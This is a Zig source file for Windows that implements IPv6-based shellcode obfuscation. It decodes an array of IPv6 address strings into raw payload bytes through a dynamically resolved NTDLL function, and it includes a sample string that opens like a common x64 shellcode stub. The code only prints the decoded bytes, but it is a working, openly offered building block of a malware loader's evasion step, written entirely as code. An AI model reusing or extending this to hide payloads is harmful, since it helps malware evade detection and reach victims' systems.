const std = @import("std");
const win = std.os.windows;
const kernel32 = win.kernel32;

const NTSTATUS = win.NTSTATUS;
const BOOLEAN = win.BOOLEAN;
const PCSTR = [*:0]const u8;
const PVOID = ?*anyopaque;
const PBYTE = [*]u8;
const SIZE_T = usize;

// Define function pointer type for RtlIpv6StringToAddressA
const fnRtlIpv6StringToAddressA = fn (
    S: PCSTR,
    Terminator: *PCSTR,
    Addr: PVOID,
) callconv(win.WINAPI) NTSTATUS;

/// Deobfuscates an array of IPv6 strings into a byte buffer
pub fn ipv6Deobfuscation(
    ipv6Array: []const [*:0]const u8,
    allocator: std.mem.Allocator,
) !struct { buffer: []u8, size: SIZE_T } {
    // Create a UTF-16 string for "NTDLL"
    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral("NTDLL");

    // Load the NTDLL library using wide string
    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);
    if (ntdll_module == null) {
        std.debug.print("[!] GetModuleHandle Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetModuleHandleFailed;
    }

    // Get the address of RtlIpv6StringToAddressA function
    const rtlIpv6StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, "RtlIpv6StringToAddressA");
    if (rtlIpv6StringToAddressA_ptr == null) {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetProcAddressFailed;
    }

    // Cast the function pointer to the correct type
    const rtlIpv6StringToAddressA: *const fnRtlIpv6StringToAddressA = @ptrCast(rtlIpv6StringToAddressA_ptr);

    // Calculate the size of the buffer needed (number of IPv6 addresses * 16 bytes each)
    const bufferSize = ipv6Array.len * 16; // IPv6 addresses are 16 bytes each

    // Allocate memory for the deobfuscated shellcode
    const buffer = try allocator.alloc(u8, bufferSize);
    errdefer allocator.free(buffer);

    // Using a raw pointer to keep track of our current position
    var tmpBuffer: [*]u8 = buffer.ptr;

    // Deobfuscate each IPv6 address
    for (ipv6Array) |ipv6Address| {
        var terminator: PCSTR = undefined;

        // Convert the IPv6 string to bytes
        const status = rtlIpv6StringToAddressA(ipv6Address, &terminator, tmpBuffer);

        // Check if the status is not SUCCESS (0)
        if (status != NTSTATUS.SUCCESS) {
            std.debug.print("[!] RtlIpv6StringToAddressA Failed At [{s}] With Error 0x{X:0>8}\n", .{ ipv6Address, @intFromEnum(status) });
            return error.RtlIpv6StringToAddressFailed;
        }

        // Increment tmpBuffer by 16 bytes for the next address
        // Fixed version using pointer arithmetic
        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 16));
    }

    return .{ .buffer = buffer, .size = bufferSize };
}

pub fn main() !void {
    // Setup allocator
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // Example array of IPv6 addresses (shellcode encoded as IPv6)
    const ipv6_array = [_][*:0]const u8{
        "fc48:83e4:f0e8:c000:0000:4151:4150:5251",
    };

    std.debug.print("[+] Attempting to deobfuscate {} IPv6 addresses\n", .{ipv6_array.len});

    // Call the deobfuscation function
    const result = try ipv6Deobfuscation(&ipv6_array, allocator);
    defer allocator.free(result.buffer);

    std.debug.print("[+] Successfully deobfuscated shellcode\n", .{});
    std.debug.print("[+] Buffer size: {} bytes\n", .{result.size});

    // Print all bytes
    std.debug.print("[+] Deobfuscated bytes: ", .{});
    for (result.buffer) |byte| {
        std.debug.print("{X:0>2} ", .{byte});
    }
    std.debug.print("\n", .{});
}
